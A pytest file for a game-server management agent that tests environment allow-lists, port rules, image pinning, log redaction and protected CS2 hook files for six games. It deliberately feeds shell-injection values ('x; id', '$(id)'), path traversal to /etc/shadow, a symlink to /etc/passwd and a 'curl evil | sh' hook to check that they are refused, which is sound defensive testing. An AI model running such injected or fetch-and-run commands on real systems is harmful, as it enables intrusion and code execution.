"""The six more games (Palworld, Valheim, Project Zomboid, HKMP, CS2, Rust): profiles, environment
policy (CS2's eval'd values above all), 1:1 ports, image digests, log redaction, the literal owner and
protected paths of CS2, Docker's init, the console's ``screen`` guard and the RCON driver's options."""

from __future__ import annotations

import os
import socket
import struct
import threading
import uuid
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest
from pydantic import ValidationError

from mcagent import docker_ops, drivers, main, profiles, rcon
from mcagent.config import Settings
from mcagent.docker_ops import StopResult
from mcagent.drivers import console_io
from mcagent.drivers.console import ConsoleDriver
from mcagent.drivers.rcon import RconDriver
from mcagent.errors import AgentError
from mcagent.profiles import cs2, hkmp, palworld, rust, valheim, zomboid
from mcagent.schemas import InstanceSpec

IID = uuid.UUID("7c2e4a6b-8d0f-4e1a-9b3c-5d7e9f1a2b3c")
PASSWORD = "Hd8Ks2Lq5Wm9Xp3Rt7Vb1Nc4Zf6Gj0Ya"
RUST_IMAGE = f"didstopia/rust-server@{rust.IMAGE_DIGESTS[0]}"
IMAGES = {
    "palworld": "thijsvanloef/palworld-server-docker:v2.8.1",
    "valheim": "ghcr.io/community-valheim-tools/valheim-server:1.4.1",
    "project-zomboid": "indifferentbroccoli/projectzomboid-server-docker:v1.2.0",
    "hkmp": "maximalmax90/hkmpserver:v2.4.3-2",
    "cs2": "joedwards32/cs2:5.0.1",
    "rust": RUST_IMAGE,
}
NEW = tuple(IMAGES)


def make_spec(game: str, env: dict[str, str] | None = None, ports=(), **over: Any) -> InstanceSpec:
    values: dict[str, Any] = {
        "name": "t",
        "image": IMAGES[game],
        "memory_limit_mb": 8192,
        "rcon_password": PASSWORD,
        "game": game,
        "env": env or {},
        "ports": [{"container_port": p, "host_port": p, "protocol": proto} for p, proto in ports],
    }
    values.update(over)
    return InstanceSpec(**values)


@pytest.fixture
def settings(tmp_path, monkeypatch) -> Settings:
    for var in list(os.environ):
        if var.startswith("AGENT_"):
            monkeypatch.delenv(var)
    s = Settings(
        data_root=tmp_path / "data",
        host_data_root=Path("/mnt/cache/appdata/mcpanel"),
        token="t",
        runtime_uid=99,
        runtime_gid=100,
    )
    s.state_dir.mkdir(parents=True, exist_ok=True)
    return s


def kwargs(settings, spec):
    return docker_ops.build_create_kwargs(settings, IID, spec, "h", [])


def refused(settings, spec, code="env_not_allowed"):
    with pytest.raises(AgentError) as exc:
        kwargs(settings, spec)
    assert exc.value.code == code, str(exc.value)
    return exc.value


# --- registration, /v1/info --------------------------------------------------------------------------
def test_the_six_are_registered_with_their_drivers():
    assert [p.game for p in profiles.all_profiles()][-6:] == [
        "palworld", "valheim", "project-zomboid", "hkmp", "cs2", "rust",
    ]  # fmt: skip
    expected = {
        "palworld": "palworld-api",
        "valheim": "none",
        "project-zomboid": "rcon",
        "hkmp": "console",
        "cs2": "rcon",
        "rust": "webrcon",
    }
    for game, control in expected.items():
        profile = profiles.get(game)
        assert profile is not None and profile.control == control
        assert profile.restart_policy == "no"
        assert drivers.for_profile(profile).id == control


def test_info_lists_them(settings):
    games = profiles.info(settings)
    assert games["hkmp"]["health"] == "image" and games["cs2"]["health"] == "a2s"
    assert games["rust"]["image_digests"] == list(rust.IMAGE_DIGESTS)
    assert games["valheim"]["env_ports"] == {"SERVER_PORT": "udp"}
    assert games["valheim"]["env_port_offsets"] == {"SERVER_PORT": [[1, "udp"], [2, "udp"]]}
    assert games["cs2"]["clean_exit_codes"] == [0, 143]
    assert games["cs2"]["never_publish"] == [[27015, "tcp"]]
    assert "image_digests" not in games["factorio"] and "env_ports" not in games["satisfactory"]


def test_register_checks_the_new_fields():
    import dataclasses

    for change in (
        {"health": profiles.Health("a2s")},
        {"image_digests": ("sha256:abc",)},
        {"redact_env": ("lower-case",)},
        {"protected_paths": ("../pre.sh",)},
        {"protected_paths": ("/abs",)},
        {"env_port_offsets": {"NOT_A_PORT_VAR": ((1, "udp"),)}},
    ):
        with pytest.raises(ValueError):
            profiles.register(dataclasses.replace(cs2.PROFILE, game="cs2-bad", **change))
    assert profiles.get("cs2-bad") is None


# --- environment -----------------------------------------------------------------------------------
@pytest.mark.parametrize(
    "game,key",
    [
        ("palworld", "DISCORD_WEBHOOK_URL"),
        ("palworld", "MOD_URL_UE4SS"),
        ("palworld", "TARGET_MANIFEST_ID"),
        ("palworld", "STEAM_PASSWORD"),
        ("palworld", "INSTALL_BETA_INSIDER"),
        ("palworld", "BACKUP_CRON_EXPRESSION"),
        ("palworld", "ENABLE_PERF_THREADING_ARGS"),
        ("valheim", "PRE_SUPERVISOR_HOOK"),
        ("valheim", "POST_BOOTSTRAP_HOOK"),
        ("valheim", "VALHEIM_PLUS"),
        ("valheim", "BEPINEX"),
        ("valheim", "ADMINLIST_IDS"),
        ("valheim", "PUBLIC_TEST"),
        ("valheim", "SERVER_PASS_FILE"),
        ("valheim", "SYSLOG_REMOTE_HOST"),
        ("valheim", "DEBUG_START_FRESH"),
        ("project-zomboid", "VM_ARGS"),
        ("project-zomboid", "MEMORY_XMS_GB"),
        ("project-zomboid", "CONFIG_DIR"),
        ("project-zomboid", "FIX_MOD_CASE"),
        ("project-zomboid", "STEAM_VAC"),
        ("hkmp", "HKMP_HOME"),
        ("hkmp", "SCREENDIR"),
        ("hkmp", "STOP_TIMEOUT"),
        ("cs2", "CS2_ADDITIONAL_ARGS"),
        ("cs2", "CS2_CFG_URL"),
        ("cs2", "CS2_LOG_HTTP_URL"),
        ("cs2", "STEAMAPPVERSION"),
        ("cs2", "STEAMAPPDIR"),
        ("cs2", "DEBUG"),
        ("cs2", "CS2_IP"),
        ("cs2", "CS2_RCON_PORT"),
        ("rust", "RUST_SERVER_STARTUP_ARGUMENTS"),
        ("rust", "ENABLE_PASSWORDLESS_SUDO"),
        ("rust", "CHOWN_DIRS"),
        ("rust", "RUST_OXIDE_ENABLED"),
        ("rust", "RUST_SERVER_LEVELURL"),
        ("rust", "RUST_BRANCH"),
        ("rust", "RUST_UPDATE_CHECKING"),
        ("rust", "RUST_RCON_WEB"),
    ],
)
def test_image_variables_are_refused(settings, game, key):
    spec = make_spec(game, {key: "1"})
    error = refused(settings, spec)
    assert key in str(error)


MODULES = {
    "palworld": palworld,
    "valheim": valheim,
    "project-zomboid": zomboid,
    "hkmp": hkmp,
    "cs2": cs2,
    "rust": rust,
}


@pytest.mark.parametrize("game", NEW)
def test_agent_ids_and_fixed_values_always_win(settings, game):
    env = kwargs(settings, make_spec(game))["environment"]
    profile = profiles.get(game)
    if profile.user.kind == "drop_privileges_env":
        assert (env["PUID"], env["PGID"]) == ("99", "100")
    else:
        assert "PUID" not in env
    for key, value in getattr(MODULES[game], "FIXED_ENV", {}).items():
        assert env[key] == value
        # and a spec may not set them (strict_env): refused, never silently replaced (PZ's RCON_PORT
        # already by the spec schema)
        try:
            spec = make_spec(game, {key: value})
        except ValidationError:
            assert key in ("RCON_PORT",)
            continue
        refused(settings, spec)


@pytest.mark.parametrize(
    "game,key,value",
    [
        ("cs2", "CS2_SERVERNAME", "x; id"),
        ("cs2", "CS2_SERVERNAME", "x$(id)"),
        ("cs2", "CS2_SERVERNAME", "x`id`"),
        ("cs2", "CS2_SERVERNAME", 'x"y'),
        ("cs2", "CS2_SERVERNAME", "x'y"),
        ("cs2", "CS2_SERVERNAME", "a/b"),
        ("cs2", "CS2_SERVERNAME", "a\\b"),
        ("cs2", "CS2_SERVERNAME", "a&b"),
        ("cs2", "CS2_SERVERNAME", "a|b"),
        ("cs2", "CS2_SERVERNAME", "a\nb"),
        ("cs2", "CS2_STARTMAP", "de_dust2 +exec evil"),
        ("cs2", "CS2_STARTMAP", "de_dust2;quit"),
        ("cs2", "CS2_MAPGROUP", "mg_active$(id)"),
        ("cs2", "CS2_GAMEALIAS", "competitive;id"),
        ("cs2", "CS2_RCONPW", "short"),
        ("cs2", "CS2_RCONPW", "abcdefghijklmnop;id"),
        ("cs2", "CS2_PW", "pw with space"),
        ("cs2", "CS2_PW", "pw$HOME"),
        ("cs2", "SRCDS_TOKEN", "0123456789abcdef0123456789abcdef"),
        ("cs2", "SRCDS_TOKEN", "0123456789ABCDEF0123456789ABCDEF;id"),
        ("cs2", "CS2_MAXPLAYERS", "65"),
        ("cs2", "CS2_MAXPLAYERS", "10 +sv_cheats 1"),
        ("cs2", "CS2_LAN", "2"),
        ("cs2", "CS2_HOST_WORKSHOP_MAP", "123 ;id"),
        ("cs2", "TV_PW", "a-b"),
        ("cs2", "TV_DELAY", "1;id"),
        ("cs2", "CS2_PORT", "27015;id"),
        ("cs2", "CS2_PORT", "70000"),
        ("cs2", "TZ", "../../etc/shadow"),
        ("palworld", "SERVER_NAME", 'Pal"Island'),
        ("palworld", "SERVER_NAME", "line\nbreak"),
        ("palworld", "ADMIN_PASSWORD", "short"),
        ("palworld", "ADMIN_PASSWORD", "has space in it ok"),
        ("palworld", "PLAYERS", "33"),
        ("palworld", "EXP_RATE", "1,5"),
        ("palworld", "DIFFICULTY", "Nightmare"),
        ("palworld", "CROSSPLAY_PLATFORMS", "(Steam,Switch)"),
        ("palworld", "IS_PVP", "yes"),
        ("valheim", "SERVER_ARGS", "-nographics"),
        ("valheim", "SERVER_ARGS", "-saveinterval 600; id"),
        ("valheim", "SERVER_ARGS", "-saveinterval 600  -preset hard"),
        ("valheim", "SERVER_PASS", "four"),
        ("valheim", "SERVER_PASS", "pass word"),
        ("valheim", "WORLD_NAME", "../world"),
        ("valheim", "SERVER_PUBLIC", "1"),
        ("project-zomboid", "SERVER_NAME", "my server"),
        ("project-zomboid", "SERVER_BRANCH", "unstable"),
        ("project-zomboid", "ADMIN_PASSWORD", "a|b-pass"),
        ("project-zomboid", "MAX_PLAYERS", "101"),
        ("hkmp", "FULL_SYNC", "yes"),
        ("rust", "RUST_SERVER_NAME", '"quoted"'),
        ("rust", "RUST_SERVER_NAME", "+server.port 1"),
        ("rust", "RUST_SERVER_IDENTITY", "../x"),
        ("rust", "RUST_SERVER_WORLDSIZE", "6001"),
        ("rust", "RUST_RCON_PASSWORD", "docker"),
        ("rust", "RUST_RCON_PASSWORD", "abcdefghijklmnop/q"),
        ("rust", "RUST_SERVER_URL", "http://insecure.example"),
        ("rust", "RUST_START_MODE", "1"),
    ],
)
def test_values_outside_their_pattern_are_refused(settings, game, key, value):
    refused(settings, make_spec(game, {key: value}))


@pytest.mark.parametrize(
    "game,env",
    [
        (
            "cs2",
            {
                "CS2_SERVERNAME": "Dust Club 2.0",
                "CS2_STARTMAP": "de_inferno",
                "CS2_GAMEALIAS": "",
                "SRCDS_TOKEN": "",
            },
        ),
        (
            "cs2",
            {"CS2_BOT_QUOTA": "", "CS2_BOT_QUOTA_MODE": "fill", "CS2_HOST_WORKSHOP_COLLECTION": "3070923343"},
        ),
        ("palworld", {"SERVER_NAME": "Pal, Island & Co. (EU)", "EXP_RATE": "2.000000", "IS_PVP": "True"}),
        ("palworld", {"CROSSPLAY_PLATFORMS": "(Steam,Xbox)", "PHYSICS_ACTIVE_DROP_ITEM_MAX_NUM": "-1"}),
        (
            "valheim",
            {"SERVER_ARGS": "-saveinterval 600 -modifier raids none -setkey nomap", "STEAMCMD_ARGS": ""},
        ),
        ("project-zomboid", {"SERVER_BRANCH": "legacy41", "MEMORY_XMX_GB": "6"}),
        (
            "rust",
            {
                "RUST_SERVER_DESCRIPTION": "",
                "RUST_APP_PORT": "-1",
                "RUST_SERVER_URL": "https://example.org/x",
            },
        ),
        ("hkmp", {"FULL_SYNC": "false", "TZ": "America/Argentina/Buenos_Aires"}),
    ],
)
def test_panel_values_are_accepted(settings, game, env):
    built = kwargs(settings, make_spec(game, env))["environment"]
    for key, value in env.items():
        assert built[key] == value


@pytest.mark.parametrize(
    "game,key",
    [
        ("cs2", "CS2_RCONPW"),
        ("rust", "RUST_RCON_PASSWORD"),
        ("palworld", "ADMIN_PASSWORD"),
        ("project-zomboid", "RCON_PASSWORD"),
    ],
)
def test_the_control_secret_is_injected_and_checked(settings, game, key):
    assert kwargs(settings, make_spec(game))["environment"][key] == PASSWORD
    # a control secret that does not fit the variable's pattern is refused, never passed on
    refused(settings, make_spec(game, rcon_password="secret; touch /tmp/x #"))


def test_a_panel_password_wins_over_the_control_secret(settings):
    env = kwargs(settings, make_spec("cs2", {"CS2_RCONPW": "PanelChosenRcon12345"}))["environment"]
    assert env["CS2_RCONPW"] == "PanelChosenRcon12345"


def test_cs2_relay_password_is_derived_not_changeme(settings):
    env = kwargs(settings, make_spec("cs2"))["environment"]
    assert env["TV_PW"] == "" and len(env["TV_RELAY_PW"]) == 24 and env["TV_RELAY_PW"] != "changeme"
    assert PASSWORD not in env["TV_RELAY_PW"]


def test_zomboid_heap_fits_the_container(settings):
    assert (
        kwargs(settings, make_spec("project-zomboid", memory_limit_mb=8192))["environment"]["MEMORY_XMX_GB"]
        == "6"
    )
    assert (
        kwargs(settings, make_spec("project-zomboid", memory_limit_mb=4096))["environment"]["MEMORY_XMX_GB"]
        == "2"
    )
    refused(settings, make_spec("project-zomboid", {"MEMORY_XMX_GB": "8"}, memory_limit_mb=8192))


# --- the spec schema's reserved names -----------------------------------------------------------------
def test_valheim_may_set_server_port_and_nobody_else():
    assert make_spec("valheim", {"SERVER_PORT": "2460"}).env["SERVER_PORT"] == "2460"
    for game in ("palworld", "cs2"):
        with pytest.raises(ValidationError, match="managed by the agent"):
            make_spec(game, {"SERVER_PORT": "2460"})
    with pytest.raises(ValidationError, match="managed by the agent"):
        InstanceSpec(
            name="mc",
            image="itzg/minecraft-server:java21",
            memory_limit_mb=2048,
            rcon_password=PASSWORD,
            env={"SERVER_PORT": "1"},
        )
    with pytest.raises(ValidationError, match="managed by the agent"):
        make_spec("valheim", {"server_port": "2460"})  # only the image's own spelling


def test_zomboid_rcon_variables_stay_reserved():
    for key in ("RCON_PASSWORD", "RCON_PORT"):
        with pytest.raises(ValidationError, match="managed by the agent"):
            make_spec("project-zomboid", {key: "x" * 20})


# --- ports ---------------------------------------------------------------------------------------------
def test_ports_follow_the_variables_one_to_one(settings):
    kw = kwargs(
        settings,
        make_spec("valheim", {"SERVER_PORT": "2460"}, ports=[(2460, "udp"), (2461, "udp"), (2462, "udp")]),
    )
    assert set(kw["ports"]) == {"2460/udp", "2461/udp", "2462/udp"}
    # the defaults when the panel sets no variable
    kw = kwargs(settings, make_spec("palworld", ports=[(8211, "udp")]))
    assert kw["environment"]["PORT"] == "8211" and kw["environment"]["QUERY_PORT"] == "27015"


@pytest.mark.parametrize(
    "game,env,ports,code",
    [
        ("valheim", {"SERVER_PORT": "2460"}, [(2463, "udp")], "port_not_allowed"),  # not derived
        ("valheim", {"SERVER_PORT": "2460"}, [(2456, "udp")], "port_not_allowed"),  # the default, not named
        ("valheim", {"SERVER_PORT": "65535"}, [], "port_collision"),  # +1 does not exist
        ("cs2", {"CS2_PORT": "27030"}, [(27030, "tcp")], "port_not_allowed"),  # RCON's side of the game port
        ("cs2", {}, [(27015, "tcp")], "port_not_allowed"),
        ("cs2", {"CS2_PORT": "27030", "TV_PORT": "27030"}, [], "port_collision"),
        ("rust", {"RUST_APP_PORT": "28016"}, [], "port_collision"),  # WebRCON's port
        ("rust", {"RUST_SERVER_PORT": "28100", "RUST_SERVER_QUERYPORT": "28100"}, [], "port_collision"),
        ("rust", {}, [(28016, "tcp")], "port_not_allowed"),
        ("rust", {}, [(8080, "tcp")], "port_not_allowed"),
        ("palworld", {}, [(8212, "tcp")], "port_not_allowed"),
        ("palworld", {"PORT": "27015"}, [], "port_collision"),  # the query port's default
        ("project-zomboid", {}, [(27015, "tcp")], "port_not_allowed"),
        ("hkmp", {"PORT": "2300"}, [(2222, "udp")], "port_not_allowed"),
    ],
)
def test_port_refusals(settings, game, env, ports, code):
    refused(settings, make_spec(game, env, ports=ports), code)


# --- images: tags and digests ----------------------------------------------------------------------
def test_rust_runs_only_the_pinned_digest(settings):
    assert docker_ops.validate_image(settings, RUST_IMAGE, rust.PROFILE) == RUST_IMAGE
    with pytest.raises(AgentError) as exc:
        docker_ops.validate_image(settings, "didstopia/rust-server:latest", rust.PROFILE)
    assert exc.value.code == "invalid_image"
    with pytest.raises(AgentError) as exc:
        docker_ops.validate_image(settings, "didstopia/rust-server@sha256:" + "0" * 64, rust.PROFILE)
    assert exc.value.code == "invalid_image"
    with pytest.raises(AgentError) as exc:
        docker_ops.validate_image(settings, f"evil/rust@{rust.IMAGE_DIGESTS[0]}", rust.PROFILE)
    assert exc.value.code == "image_not_allowed"
    for bad in ("didstopia/rust-server@sha256:XYZ", f"didstopia/rust-server:latest@{rust.IMAGE_DIGESTS[0]}"):
        with pytest.raises(AgentError) as exc:
            docker_ops.validate_image(settings, bad, rust.PROFILE)
        assert exc.value.code == "invalid_image"


def test_digests_stay_refused_for_the_other_games(settings):
    for profile in (profiles.get("minecraft"), profiles.get("factorio"), cs2.PROFILE):
        with pytest.raises(AgentError, match="Image digests are not supported; use a tag"):
            docker_ops.validate_image(settings, f"joedwards32/cs2@{rust.IMAGE_DIGESTS[0]}", profile)


@pytest.mark.parametrize(
    "game,good,bad",
    [
        ("palworld", "v2.8.1", "v2.8.1-wine"),
        ("palworld", "v2.8.1", "latest"),
        ("valheim", "1.4.1", "sha-0ab6cdc"),
        ("project-zomboid", "v1.2.0", "dev"),
        ("hkmp", "v2.4.3-2", "latest"),
        ("cs2", "5.0.1", "5.0.1-pelican"),
    ],
)
def test_tag_rules(settings, game, good, bad):
    profile = profiles.get(game)
    repo = IMAGES[game].rsplit(":", 1)[0]
    assert docker_ops.validate_image(settings, f"{repo}:{good}", profile) == f"{repo}:{good}"
    with pytest.raises(AgentError):
        docker_ops.validate_image(settings, f"{repo}:{bad}", profile)


def test_pull_by_digest_passes_the_digest_as_the_tag(monkeypatch):
    calls = []
    api = SimpleNamespace(pull=lambda repo, tag, stream, decode: calls.append((repo, tag)) or iter([]))
    monkeypatch.setattr(docker_ops, "client", lambda: SimpleNamespace(api=api))
    docker_ops.pull_image(RUST_IMAGE)
    docker_ops.pull_image("joedwards32/cs2:5.0.1")
    assert calls == [("didstopia/rust-server", rust.IMAGE_DIGESTS[0]), ("joedwards32/cs2", "5.0.1")]
    assert docker_ops._repo_of(RUST_IMAGE) == "didstopia/rust-server"


# --- container shape ---------------------------------------------------------------------------------
def test_cs2_runs_as_1000_with_init_and_no_caps(settings):
    kw = kwargs(settings, make_spec("cs2"))
    assert kw["user"] == "1000:1000" and kw["init"] is True and kw["cap_add"] == []
    assert cs2.PROFILE.literal_owner == (1000, 1000)
    for game in ("palworld", "valheim", "rust"):
        kw = kwargs(settings, make_spec(game))
        assert "init" not in kw and "user" not in kw
        assert profiles.get(game).literal_owner is None


def test_hkmp_keeps_the_image_healthcheck(settings):
    assert "healthcheck" not in kwargs(settings, make_spec("hkmp"))
    assert kwargs(settings, make_spec("cs2"))["healthcheck"] == {"test": ["NONE"]}


def test_caps_per_game(settings):
    assert kwargs(settings, make_spec("valheim"))["cap_add"] == [
        "CHOWN",
        "DAC_OVERRIDE",
        "SETUID",
        "SETGID",
        "KILL",
    ]
    assert kwargs(settings, make_spec("project-zomboid"))["cap_add"] == ["CHOWN", "DAC_OVERRIDE", "FOWNER"]
    assert kwargs(settings, make_spec("hkmp"))["cap_add"] == [
        "CHOWN",
        "DAC_OVERRIDE",
        "FOWNER",
        "SETUID",
        "SETGID",
    ]


# --- redaction ---------------------------------------------------------------------------------------
class Logged:
    def __init__(self, game, env):
        self.labels = {"io.mcpanel.game": game, "io.mcpanel.instance": str(IID)}
        self.name = "c"
        self.attrs = {"Config": {"Env": [f"{k}={v}" for k, v in env.items()]}}


def test_zomboid_admin_password_is_hidden_in_logs(settings):
    redact = docker_ops.log_redactor(
        settings, Logged("project-zomboid", {"ADMIN_PASSWORD": "zombie-Admin-1", "RCON_PASSWORD": PASSWORD})
    )
    text = "pzexe: arg: -adminpassword\npzexe: arg: zombie-Admin-1\nrcon " + PASSWORD
    assert redact(text) == "pzexe: arg: -adminpassword\npzexe: arg: ********\nrcon ********"


def test_short_values_and_unrelated_variables_are_left(settings):
    redact = docker_ops.log_redactor(
        settings, Logged("cs2", {"CS2_PW": "abc", "CS2_SERVERNAME": "Dust Club"})
    )
    assert redact("abc Dust Club") == "abc Dust Club"


def test_longest_secret_first(settings):
    redact = docker_ops.log_redactor(
        settings, Logged("cs2", {"CS2_PW": "abcd", "CS2_RCONPW": "abcdEFGHijklMNOP1234"})
    )
    assert redact("x abcdEFGHijklMNOP1234 y abcd") == "x ******** y ********"


def test_games_without_secrets_in_logs_get_no_redactor(settings):
    assert docker_ops.log_redactor(settings, Logged("hkmp", {"PORT": "2222"})) is None
    assert docker_ops.log_redactor(settings, SimpleNamespace(labels={}, name="mc", attrs={})) is None


def test_redaction_reaches_the_log_endpoint(settings, monkeypatch):
    c = Logged("rust", {"RUST_RCON_PASSWORD": PASSWORD})
    c.logs = lambda **kw: f"+rcon.password {PASSWORD}\n".encode()
    assert docker_ops._container_log(c, 10, None, settings) == "+rcon.password ********\n"


# --- CS2: the literal owner, its hooks and protected paths -------------------------------------------
@pytest.fixture
def agent_dir(agent_settings):
    path = docker_ops.instance_dir(agent_settings, IID)
    path.mkdir(parents=True)
    return path


def test_prepare_start_gives_the_folder_its_owner_and_writes_the_hooks(
    agent_settings, agent_dir, monkeypatch
):
    chowned = []
    from mcagent.safefs import SafeRoot

    monkeypatch.setattr(
        SafeRoot, "chown_tree", lambda self, uid, gid, **kw: chowned.append((str(self.root), uid, gid)) or 0
    )
    monkeypatch.setattr(SafeRoot, "_chown", lambda self, name, fd: None)
    (agent_dir / "pre.sh").write_text("curl evil | sh\n")
    os.symlink("/etc/passwd", agent_dir / "post.sh")
    docker_ops.prepare_start(agent_settings, IID, cs2.PROFILE)
    assert chowned == [(str(agent_dir), 1000, 1000)]
    assert (agent_dir / "pre.sh").read_bytes() == cs2.HOOK_SCRIPT["pre.sh"]
    assert not (agent_dir / "post.sh").is_symlink()
    assert (agent_dir / "post.sh").read_bytes() == cs2.HOOK_SCRIPT["post.sh"]


def test_prepare_start_refuses_a_folder_in_place_of_a_hook(agent_settings, agent_dir, monkeypatch):
    from mcagent.safefs import SafeRoot

    monkeypatch.setattr(SafeRoot, "chown_tree", lambda self, uid, gid, **kw: 0)
    (agent_dir / "pre.sh").mkdir()
    with pytest.raises(AgentError) as exc:
        docker_ops.prepare_start(agent_settings, IID, cs2.PROFILE)
    assert exc.value.code == "start_failed"


def test_other_games_have_no_prepare_step(agent_settings, agent_dir):
    for game in ("palworld", "valheim", "rust", "hkmp", "project-zomboid"):
        docker_ops.prepare_start(agent_settings, IID, profiles.get(game))
    assert list(agent_dir.iterdir()) == []


def test_the_server_game_record(agent_settings):
    assert docker_ops.server_owner(agent_settings, IID) == (
        agent_settings.runtime_uid,
        agent_settings.runtime_gid,
    )
    docker_ops.remember_server_game(agent_settings, IID, make_spec("palworld"))
    assert docker_ops.server_profile(agent_settings, IID) is None  # nothing to remember for Palworld
    docker_ops.remember_server_game(agent_settings, IID, make_spec("cs2"))
    assert docker_ops.server_profile(agent_settings, IID) is cs2.PROFILE
    assert docker_ops.server_owner(agent_settings, IID) == (1000, 1000)
    assert docker_ops.server_protected_paths(agent_settings, IID) == (
        "pre.sh",
        "post.sh",
        "game/csgo/cfg/server.cfg",
    )
    docker_ops.forget_server_game(agent_settings, IID)
    assert docker_ops.server_profile(agent_settings, IID) is None
    docker_ops.forget_server_game(agent_settings, IID)  # twice is fine


@pytest.mark.parametrize(
    "method,url,body",
    [
        ("put", "files/text", {"path": "pre.sh", "content": "curl evil | sh"}),
        ("put", "files/text", {"path": "./post.sh", "content": "x"}),
        ("put", "files/text", {"path": "game/csgo/cfg/server.cfg", "content": "rcon_password x"}),
        ("post", "files/mkdir", {"path": "pre.sh"}),
        ("post", "files/rename", {"source": "evil.sh", "destination": "pre.sh", "overwrite": True}),
        ("post", "files/rename", {"source": "pre.sh", "destination": "pre.old"}),
        ("post", "files/delete", {"paths": ["post.sh"]}),
        ("post", "files/delete", {"paths": ["game/csgo/cfg/server.cfg"]}),
    ],
)
def test_protected_paths_through_the_file_api(api, auth, agent_settings, agent_dir, method, url, body):
    docker_ops.remember_server_game(agent_settings, IID, make_spec("cs2"))
    (agent_dir / "evil.sh").write_text("x")
    (agent_dir / "pre.sh").write_text("hook")
    (agent_dir / "post.sh").write_text("hook")
    (agent_dir / "game/csgo/cfg").mkdir(parents=True)
    (agent_dir / "game/csgo/cfg/server.cfg").write_text("cfg")
    r = getattr(api, method)(f"/v1/instances/{IID}/{url}", json=body, headers=auth)
    assert r.status_code == 403, r.text
    assert r.json()["error"]["code"] == "managed_file"
    assert (agent_dir / "pre.sh").read_text() == "hook" and (agent_dir / "post.sh").read_text() == "hook"
    assert (agent_dir / "game/csgo/cfg/server.cfg").read_text() == "cfg"


def test_other_files_of_cs2_are_writable(api, auth, agent_settings, agent_dir):
    docker_ops.remember_server_game(agent_settings, IID, make_spec("cs2"))
    (agent_dir / "game/csgo/cfg").mkdir(parents=True)
    r = api.put(
        f"/v1/instances/{IID}/files/text",
        json={"path": "game/csgo/cfg/gamemode_competitive_server.cfg", "content": "mp_maxrounds 24\n"},
        headers=auth,
    )
    assert r.status_code == 200, r.text


def test_without_a_record_nothing_is_protected(api, auth, agent_dir):
    r = api.put(f"/v1/instances/{IID}/files/text", json={"path": "pre.sh", "content": "x"}, headers=auth)
    assert r.status_code == 200


def test_extraction_skips_the_games_protected_paths(agent_settings):
    docker_ops.remember_server_game(agent_settings, IID, make_spec("cs2"))
    assert main._with_game_protected(agent_settings, IID, ["world"]) == [
        "world", "pre.sh", "post.sh", "game/csgo/cfg/server.cfg",
    ]  # fmt: skip
    other = uuid.uuid4()
    assert main._with_game_protected(agent_settings, other, ["world"]) == ["world"]
    assert main._with_game_protected(agent_settings, other, None) is None


# --- consoles: the screen guard (HKMP) ---------------------------------------------------------------
@pytest.mark.parametrize(
    "line",
    [
        "announce x^Mlist",
        "announce y\\015list",
        "say \\r",
        "^C",
        "a\rb",
        "   ",
        "\t",
        # screen substitutes the session's environment (end-to-end run: $HOME arrived as /data)
        "announce $HOME",
        "announce ${PATH}",
        "announce costs 5$",
    ],
)
def test_screen_guard_refuses_keys_and_escapes(line):
    with pytest.raises(AgentError) as exc:
        console_io.sanitise_line(line, guard="screen")
    assert exc.value.code == "console_line_refused"


def test_screen_guard_keeps_ordinary_lines():
    assert console_io.sanitise_line("  announce Hello, it's 5:00 - see you @ base ", guard="screen") == (
        "announce Hello, it's 5:00 - see you @ base"
    )


def test_hkmp_refuses_the_helpers_own_subcommands():
    driver = drivers.for_profile(hkmp.PROFILE)
    assert isinstance(driver, ConsoleDriver)
    for line in hkmp.HELPER_COMMANDS:
        with pytest.raises(AgentError):
            driver.sanitise(line)
    assert driver.sanitise("list") == "list"
    assert driver.sanitise("status of things") == "status of things"  # only the whole line


class ExecContainer:
    def __init__(self):
        self.id = "h1"
        self.labels = {"io.mcpanel.instance": str(IID), "io.mcpanel.game": "hkmp"}
        self.attrs = {"Config": {"Env": ["PUID=99", "PGID=100", "PORT=2222"]}}


def test_hkmp_reply_is_the_helpers_output(settings, monkeypatch):
    calls = []

    def fake_exec(c, template, line, *, user, timeout=None):
        calls.append((tuple(template), line, user))
        return "[INFO] list\r\n[INFO] Online players (1): Hornet\n"

    monkeypatch.setattr(console_io, "exec_line", fake_exec)
    monkeypatch.setattr(console_io, "read_output", lambda *a, **k: pytest.fail("the log is not read"))
    driver = drivers.for_profile(hkmp.PROFILE)
    out = driver.command_sync(settings, ExecContainer(), "list", 10)
    assert out == "[INFO] list\n[INFO] Online players (1): Hornet"
    assert calls == [(("hkmp", "{line}"), "list", "99:100")]


def test_hkmp_reply_leaves_out_screens_own_notes(settings, monkeypatch):
    # after `docker restart` the previous run's dead session socket is still there: screen says so first
    monkeypatch.setattr(
        console_io,
        "exec_line",
        lambda c, t, line, *, user, timeout=None: (
            "Remove dead screens with 'screen -wipe'.\n[INFO] list\n[INFO] Online players (0): \n"
        ),
    )
    out = drivers.for_profile(hkmp.PROFILE).command_sync(settings, ExecContainer(), "list", 10)
    assert out == "[INFO] list\n[INFO] Online players (0):"


def test_hkmp_broadcast_announces(settings, monkeypatch):
    sent = []
    monkeypatch.setattr(
        console_io, "exec_line", lambda c, t, line, *, user, timeout=None: sent.append(line) or ""
    )
    drivers.for_profile(hkmp.PROFILE).broadcast(settings, ExecContainer(), "Back in 5")
    assert sent == ["announce Back in 5"]


def test_exec_reply_needs_the_exec_transport():
    with pytest.raises(ValueError):
        ConsoleDriver(transport="stdin", exec_reply="stdout")
    with pytest.raises(ValueError):
        ConsoleDriver(transport="exec", exec_argv=("x", "{line}"), exec_reply="log")


# --- RCON: the port from a variable, quit before the stop, the srcds login -----------------------------
class RconContainer:
    def __init__(self, env, status="running"):
        self.id = "r1"
        self.name = "mcpanel-r1"
        self.status = status
        self.labels = {"io.mcpanel.instance": str(IID), "io.mcpanel.game": "cs2"}
        self.attrs = {
            "Config": {"Env": [f"{k}={v}" for k, v in env.items()], "Image": "joedwards32/cs2:5.0.1"},
            "State": {"Status": status, "Running": status == "running"},
            "NetworkSettings": {"Networks": {"mcpanel_instances": {"IPAddress": "10.1.2.3"}}, "Ports": {}},
            "HostConfig": {},
        }
        self.reloads = 0
        self.stopped_with = None

    def reload(self):
        self.reloads += 1

    def stop(self, timeout):
        self.stopped_with = timeout
        self.status = "exited"


def test_cs2_rcon_follows_the_game_port(settings):
    driver = drivers.for_profile(cs2.PROFILE)
    assert isinstance(driver, RconDriver)
    assert driver.endpoint(settings, RconContainer({"CS2_PORT": "27030", "CS2_RCONPW": PASSWORD})) == (
        "10.1.2.3",
        27030,
        PASSWORD,
    )
